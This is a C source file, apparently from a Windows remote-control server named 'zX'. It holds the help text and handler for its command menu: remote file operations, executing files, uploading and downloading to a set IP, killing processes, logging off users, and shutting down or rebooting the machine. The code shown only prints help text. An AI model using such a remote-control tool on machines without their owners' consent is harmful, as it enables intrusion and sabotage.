#include <windows.h>

#include "types.h"
#include "server.h"
#include "command.h"

#define fHELP                                                           \
        "+ ls< [wild-cards]>        List Sub files\r\n"						      \
				"+ dl                       Drive List\r\n"							        \
				"+ cd< [dir]>               <change> Current Directory\r\n"			\
				"+ md [dir]                 Make Directory\r\n"						      \
				"+ cp <[src]>|[dtn]         CoPy from [src] to [dtn]\r\n"			  \
				"+ mv <[src]>|[dtn]         MoVe [src] to [dtn]\r\n"				    \
				"+ rm [file]                ReMove [file]\r\n"						      \
				"+ at [attr]|[file]         change ATtribs of [file]\r\n"			  \
				"+ ex [file]<|[param]>      EXecute [file]"				          \

#define tHELP                                                           \
        "+ pt< <[ip_hex]>:[port]>   set <ip &> PorT for data txr\r\n"		\
				"+ ip< [ip]>                set IP for data txr\r\n"				    \
				"+ mc [hostname]            set MaChine for data txr\r\n"			  \
				"+ dn [file]                DowNload [file]\r\n"					      \
				"+ up [file]                UPload [file]"				          \
			  /*"+ ux:[file]                Upload and eXecute file\r\n"			\*/

#define HELP                                                            \
        "+ ps                       Process Status\r\n"						      \
				"+ kl [pid]                 KilL Process\r\n"						        \
				"+ wc< [operation]>         Window Control commands\r\n"			  \
				"+ sm< [operation]>         SysteM commands\r\n"					      \
				"+ bp< [num]>               system BeeP, [num] times\r\n"			  \
				"+ mx [m]<|<[t]>|<[i]>|[b]> display Message boX\r\n"				    \
				"+ eo                       toggle terminal echo on/off\r\n"		\
				"+ hi                       server info\r\n"						        \
				"+ qt                       QuiT, terminate connection\r\n"			\
				"+ zX                       shutdown the zX server.\r\n"			  \
				"+ hp< [command]>           HelP on command\r\n"					      \
				"+ \?\?< [command]>           help on command"

#define H_sm                                                            \
        "+ sm< [op_code]>           execute SysteM functions.\r\n"      \
				"+        sr                run Screen saveR {default}\r\n"			\
				"+        ml                Monitor Low power\r\n"					    \
				"+        mf                Monitor ofF\r\n"					        	\
				"+        mf                Monitor oN\r\n"							        \
				"+        lf                Log ofF current user\r\n"			    	\
				"+        sn                ShutdowN the system\r\n"				    \
				"+        rt                RebooT the system\r\n"					    \
				"+        sy                put system into StandbY\r\n"        \
				"*        cl                Close alL windows\r\n"

#define H_wc                                                            \
        "+ wc< [op_code]>           Window Control commands.\r\n"			  \
				"+        mn                MiNimize window {default}\r\n"			\
				"+        mx                MaXimize window\r\n"					      \
				"+        rs                ReStore window\r\n"						      \
				"*        co                ClOse window\r\n"

#define H_mx	"+ mx [message]<|<[title]>|<[icon]>|[button]>\r\n"				\
				"+   [icon]   ! :exclamation   ? :question\r\n"						      \
				"+            i :information   e :error\r\n"						        \
				"+   [button] ok:okay          oc:ok,cancel\r\n"					      \
				"+            yn:yes,no        yc:yes,no,cancel\r\n"				    \
				"*            rc:retry,cancel  ar:abort,retry,ignore\r\n"


// help commands // hp
int zXcmd_hp(pCommandData X)
{
	switch(X->argc?*(unsigned short *)(X->argv[X->argc]):0)
	{
		case c_sm:
			wsprintf(X->sbuf,"%s*:hp| system command",H_sm);
			break;
		case c_wc:
			wsprintf(X->sbuf,"%s*:hp| window control command",H_wc);
			break;
		case c_mx:
			wsprintf(X->sbuf,"%s*:hp| message box command",H_mx);
			break;
		case c_dn:
		case c_up:
		case c_ux:
		case c_hi:
		case c_qt:
		case c_zX:
			lstrcpy(X->sbuf,"-:hp| sorry! command help unimplemented ...");
			break;
		default:
			lstrcpy(X->sbuf,fHELP);sendStr(X);
			lstrcpy(X->sbuf,tHELP);sendStr(X);
			lstrcpy(X->sbuf,HELP);sendStr(X);
			wsprintf(X->sbuf,"*:hp| end of command list");
	}
	sendStr(X);
	return 0;
}